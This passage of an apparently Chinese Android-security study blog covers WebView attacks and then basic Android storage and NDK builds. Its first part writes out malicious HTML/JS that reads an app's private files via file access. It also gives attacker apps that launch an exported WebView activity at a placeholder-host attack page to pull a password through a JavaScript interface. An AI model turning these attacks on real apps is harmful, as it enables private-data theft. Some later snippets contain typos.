is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后将js脚本上传置/data/local/tmp目录下</p><p>编写攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">      webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p><h4 id="通用协议漏洞-恶意网页注入">通用协议漏洞(恶意网页注入)</h4><p>漏洞原理：setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p><p>本质和上面的差不多，将js脚本链接改为一个网页的url</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="符号链接跨源攻击">符号链接跨源攻击</h4><p>setAllowFileAccess为True</p><p><strong>原理：</strong></p><p>其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。</p><h3 id="intent-webview">intent+webview</h3><p>样例代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class JsIntentActivity extends AppCompatActivity &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        WebView webView = findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">        webView.addJavascriptInterface(new AndroidtoJs(), &quot;test&quot;);</span><br><span class="line">        webView.loadData(&quot;&quot;, &quot;text/html&quot;, null);</span><br><span class="line">        Uri getUri = getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * 提供接口在Webview中供JS调用</span><br><span class="line">     */</span><br><span class="line">    public class AndroidtoJs &#123;</span><br><span class="line">        // 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span><br><span class="line">        @JavascriptInterface</span><br><span class="line">        public String getPassword() &#123;</span><br><span class="line">            return &quot;WindXaa12345678&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>样例的控件为可导出</p><p>攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地编写恶意的html，利用前面讲述的远程加载</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>攻击获得的数据将显示在此……<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Intent重定向导致launchAnyWhere漏洞">Intent重定向导致launchAnyWhere漏洞</h3><p>通过一定的方法可以访问未导出的组件，我们将这种漏洞成为<code>launchAnyWhere</code>漏洞</p><p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p><p>首先是不可导出组件PrivateActivity:  可导出的组件：WebView2Activity</p><p>WebView2Activity关键代码如下<img src="assets/905443_UTXVH9Q5AYRTWVH.png" alt="image-20220730125041041"></p><p>PrivateActivity关键代码如下：</p><p><img src="assets/905443_MMQXRU274JXCJRT.png" alt="image-20220730125108657"></p><p>攻击脚本<br><img src="assets/905443_W4Q2EBR4BJMXG2R.png" alt="image-20220730125254413"></p><h2 id="数据存储">数据存储</h2><h3 id="Android中的数据存储Preference">Android中的数据存储Preference</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//保存配置文件</span></span><br><span class="line">        <span class="type">SharedPreferences</span>  <span class="variable">sp</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;config&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        SharedPreferences <span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sp.edit();</span><br><span class="line">        editor.putInt(<span class="string">&quot;player_level&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        editor.putString(<span class="string">&quot;player_name&quot;</span>,<span class="string">&quot;myname&quot;</span>);</span><br><span class="line">        editor.commit();</span><br><span class="line">        <span class="comment">//读取文件</span></span><br><span class="line">        <span class="type">SharedPreferences</span>  <span class="variable">sp</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;config&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        <span class="type">String</span> <span class="variable">player_name</span> <span class="operator">=</span> sp.getString(<span class="string">&quot;player_name&quot;</span>,<span class="string">&quot;noname&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">player_level</span> <span class="operator">=</span> sp.getString(<span class="string">&quot;player_level&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;player_name:&quot;</span>+player_name+<span class="string">&quot;player_level:&quot;</span>+player_level);</span><br><span class="line">                </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h3 id="Android中的文件操作File，自定义文件格式">Android中的文件操作File，自定义文件格式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">button = findViewById(R.layout.button2);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> getFilesDir();</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,dir.getAbsolutePath()); <span class="comment">//打印绝对路径 /data/user/包名/files</span></span><br><span class="line">        <span class="comment">//创建目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir.getAbsolutePath()+<span class="string">&quot;/newDir&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file.exits())&#123;</span><br><span class="line">            file.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建文件</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">mydat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file.getAbsolutePath()+<span class="string">&quot;/mydat.dat&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!mydat.exits())&#123;</span><br><span class="line">           mydat.createNewFile();   </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//FileOutputStream fos = openFileOutput(&quot;mydata.dat&quot;,MODE_PRIVATE);</span></span><br><span class="line">            <span class="comment">//上面这个代码等价于 创建一个文件并new一个输入流</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//写入文件</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(mydat);</span><br><span class="line">            fos.write(<span class="string">&quot;hello&quot;</span>.getBytes() );</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(fos);</span><br><span class="line">            dos.writeInt(<span class="number">100</span>);</span><br><span class="line">            dos.writeFloat(<span class="number">3.5f</span>);</span><br><span class="line">            fos.close();</span><br><span class="line">            dos.close();</span><br><span class="line">            <span class="comment">//读取文件</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> openFileInput(<span class="string">&quot;mydata.dat&quot;</span>);</span><br><span class="line">            <span class="type">byte</span> buff[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>];</span><br><span class="line">            fis.read(buff,<span class="number">0</span>,<span class="number">5</span>);<span class="comment">//读取长度5   fis.read(buff);</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buff);</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(fis);</span><br><span class="line">            <span class="type">int</span> <span class="variable">int_value</span> <span class="operator">=</span> dis.readInt();</span><br><span class="line">            <span class="type">float</span> <span class="variable">float_value</span> <span class="operator">=</span> dis.readFloat();</span><br><span class="line">            dis.close();</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="comment">//遍历文件</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">fileEnum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/data/data/&quot;</span>+getPackageName());</span><br><span class="line">            File[] files = fileEnum.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File f : files)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,f.getAbsolutePath());           </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//随机读写文件 </span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(<span class="string">&quot;mydata.dat&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.seek(<span class="number">4</span>);</span><br><span class="line">            randomAccessFile.readInt();                      </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Android中的数据库SQLite">Android中的数据库SQLite</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SQL语法进行</span></span><br><span class="line">button = findViewById(R.layout.button3);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> openOrCreateDatabase(<span class="string">&quot;student&quot;</span>,MODE_PRIVATE,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//增加 删除 修改 查阅</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//db.execSQL(&quot;CREATE TABLE T_STUDENT (SID VARCHAR(50) PRIMARY KEY, SNAME VARCHAR(50))&quot;);</span></span><br><span class="line">            db.execSQL(<span class="string">&quot;INSERT INTO T_STUDENT VALUES(&quot;</span>S001<span class="string">&quot;,&quot;</span>张三<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            <span class="comment">//查询</span></span><br><span class="line">            <span class="comment">//Cursor cursor = db.query(&quot;T-STUDENT&quot;,null,null,null,null,null,&quot;sid desc&quot;);</span></span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(<span class="string">&quot;SELECT *FROM T_STUDENT&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            cursor.moveToFirst();</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">sid</span> <span class="operator">=</span> cursor.getString(<span class="number">0</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">sname</span> <span class="operator">=</span> cursor.getString(<span class="number">1</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(SQLException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不使用sql语法</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">valuse.put(<span class="string">&quot;SID&quot;</span>,<span class="string">&quot;S002&quot;</span>);</span><br><span class="line">valuse.put(<span class="string">&quot;SNAME&quot;</span>,<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">db.insert(<span class="string">&quot;T_student&quot;</span>,<span class="literal">null</span>,values);</span><br><span class="line">db.delete(<span class="string">&quot;T_STUDENT&quot;</span>,<span class="string">&quot;SID=? sname=?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;s001&quot;</span>,<span class="string">&quot;张三&quot;</span>&#125; );    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sdcard</span></span><br><span class="line">button = findViewById(R.layout.button4);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//获取sdcard路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">        <span class="type">File</span> <span class="variable">newFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file.getAbsolutePath()+<span class="string">&quot;/Download/mysd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            newFile.createNewFile();         </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;          </span><br><span class="line">    &#125; </span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>配置文件中给用户权限：<img src="assets/image-20231026205554596.png" alt="image-20231026205554596"></p><h2 id="使用NDK编译">使用NDK编译</h2><ul><li>编译Hello.c文件</li></ul><p>i686-linux-android16-clang -c -o Hello.o Hello.c</p><p>i686-linux-android16-clang  -o Hello Hello.o</p><ul><li>使用makefile编译，编译notepad.exe</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">notepad<span class="selector-class">.exe</span>:mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line">link /OUT:notepad<span class="selector-class">.exe</span> mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line"></span><br><span class="line">mou1<span class="selector-class">.obj</span>:mou1<span class="selector-class">.c</span> mou1<span class="selector-class">.h</span></span><br><span class="line">cl /c mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">mou2<span class="selector-class">.obj</span>:mou2<span class="selector-class">.c</span> mou2<span class="selector-class">.h</span></span><br><span class="line">cl /c mou2<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.obj</span>:notepad<span class="selector-class">.c</span></span><br><span class="line">cl /c notepad.c</span><br></pre></td></tr></table></figure><ul><li>对上面使用变量赋值，可维护性</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">OBJECTS := mou1.obj mou2.obj notepad.obj</span><br><span class="line">CC := cl</span><br><span class="line">BUILD_FLAGS := /c</span><br><span class="line">LINK_FLAGS := /OUT:notepad.exe</span><br><span class="line"></span><br><span class="line"><span class="section">notepad.exe:<span class="variable">$(OBJECTS)</span></span></span><br><span class="line">link <span class="variable">$(LINK_FLAGS)</span> <span class="variable">$(OBJECTS)</span></span><br><span class="line"></span><br><span class="line"><span class="section">mou1.obj:mou1.c mou1.h</span></span><br><span class="line"><span class="variable">$(CC)</span> <span 